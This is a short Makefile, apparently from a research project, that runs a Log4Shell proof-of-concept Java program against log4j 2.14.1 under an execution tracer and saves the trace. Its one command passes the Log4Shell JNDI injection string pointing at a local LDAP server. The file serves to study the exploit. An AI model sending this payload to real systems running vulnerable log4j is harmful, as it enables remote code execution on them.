.PHONY: all
all: log4shell.trace.txt

log4shell.trace.txt: vulnerable-app/log4shell-poc.jar
	mttn --ignore-unsupported-memops java -- \
		-cp vulnerable-app/log4shell-poc.jar:vulnerable-app/lib/log4j-api-2.14.1.jar:vulnerable-app/lib/log4j-core-2.14.1.jar \
		com.trailofbits.log4shell.PoC '$${jndi:ldap://127.0.0.1:1337/pwn}' \
	> $@
